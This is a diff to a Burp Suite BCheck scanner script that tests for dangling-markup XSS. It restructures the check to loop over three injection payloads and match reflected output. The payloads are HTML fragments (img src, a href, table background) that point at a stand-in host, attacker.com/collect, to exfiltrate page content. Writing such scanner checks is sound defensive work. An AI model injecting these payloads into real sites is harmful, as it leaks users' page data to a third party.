@@ -5,15 +5,16 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xss", "dangling-markup"
 
+run for each:
+    payload = "><img src='https://attacker.com/collect?",
+        "' ><a href='https://attacker.com/collect?",
+        "\"><table background='https://attacker.com/collect?"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "><img src='https://attacker.com/collect?"
-            - "' ><a href='https://attacker.com/collect?"
-            - "\"><table background='https://attacker.com/collect?"
+        replacing: {payload}
 
-    if {check.response} matches "(src='https://attacker|href='https://attacker|background='https://attacker)" then
+    if {latest.response} matches "(src='https://attacker|href='https://attacker|background='https://attacker)" then
         report issue:
             severity: medium
             confidence: tentative
